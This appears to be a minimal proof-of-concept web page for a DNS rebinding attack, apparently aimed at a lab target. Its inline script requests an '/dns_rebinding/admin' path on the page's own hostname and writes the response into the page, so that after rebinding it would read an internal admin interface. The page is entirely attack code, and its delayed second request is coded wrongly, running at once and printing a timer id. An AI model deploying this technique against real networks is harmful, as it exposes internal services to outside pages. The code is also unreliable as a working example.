<!DOCTYPE html>
<html>
<body>

<p>DNS Rebinding</p>

<script>
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function TargetURL() {
  var URL = window.location.hostname;
  URL = "https://" + URL + "/dns_rebinding/admin";
  return URL;
}

document.write(TargetURL());
var URL = httpGet(TargetURL());
document.write(URL);
var URL2 = setTimeout(httpGet(TargetURL()), 3000);
document.write(URL2);
</script>

</body>
</html>
